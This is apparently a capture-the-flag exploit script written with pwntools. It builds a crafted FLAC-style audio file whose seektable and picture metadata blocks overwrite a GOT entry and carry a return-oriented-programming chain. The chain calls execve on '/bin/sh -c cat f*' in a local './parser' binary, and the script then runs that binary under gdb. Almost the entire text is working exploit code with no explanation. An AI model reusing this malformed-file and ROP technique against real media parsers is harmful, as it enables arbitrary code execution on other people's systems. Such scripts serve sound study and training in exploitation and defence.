#!/usr/bin/env python3

from pwn import *
context.terminal = ["terminator", "-e"]
context.arch = 'amd64'

def p24(a):
    return p32(a)[:-1][::-1]

def big_p32(a):
    return p32(a)[::-1]

def big_p64(a):
    return p64(a)[::-1]


got_address = 0x5dc100


TYPE_STREAMINFO = 0
TYPE_PADDING = 1
TYPE_APPLICATION = 2
TYPE_SEEKTABLE = 3
TYPE_VORBIS_COMMENT = 4
TYPE_CUESHEET = 5
TYPE_PICTURE = 6

POP_RDI = 0x000000000040591d
POP_RSI = 0x00000000004073a3
POP_RAX = 0x000000000042111a
POP_RBP = 0x0000000000404263
POP_RDX_RBX = 0x0000000000533dab
SYSCALL = 0x00000000004a7fd9
RET = 0x000000000040101a

elf = ELF("./parser")

def picture():

    chain =  flat(
        POP_RDI,
        got_address+0x10,
        POP_RSI,
        got_address+0x23,
        POP_RDX_RBX,
        0x0, 0x0,
        POP_RAX,
        0x3b,
        SYSCALL
    )
    data = p64(0x00000000004e4ba2) + p64(0x0000000000536582) + b"/bin/sh\x00" + b"-c\x00cat f*\x00" + p64(0x5dc110) + p64(0x5dc118) + p64(0x5dc11b)+ p64(0x0) + b"\x00"*(23-8-8)+ chain

    dataLength = 0x100
    img_data = p8(TYPE_PICTURE) + p24(4 + (4 + len(data)) * 2 + 16 + 4 + dataLength) + big_p32(0x8888) + big_p32(len(data)) + data + big_p32(len(data)) + data 

    img_data += big_p32(1) * 4 + big_p32(dataLength) + cyclic(3, n=8) + chain + b"B"*(dataLength-3-len(chain))
 
    return img_data


def seek_table(table):
    data = p8(TYPE_SEEKTABLE) + p24(18 * len(table))
    for i in range(len(table)):
        data = data + big_p64(table[i][0]) + big_p64(table[i][1]) + p16(table[i][2])
    return data


#info 
data = p32(0x664c6143)[::-1]  + p8(TYPE_STREAMINFO) + p24(34) + p16(0) + p16(0x69) + p24(0) + p24(0x69) + big_p32(0) + big_p32(1) + b'.' * 16
 
data += seek_table([[0, 0,0] ] * 8)  + picture() + seek_table([[got_address, got_address, 0] ] * 8) + picture()

open("./ashfaq", "wb").write(data)

io = gdb.debug(['./parser', './ashfaq'],
    gdbscript="""
    b *0x000000000040591d
    b *0x0000000000536582
""")
io.interactive()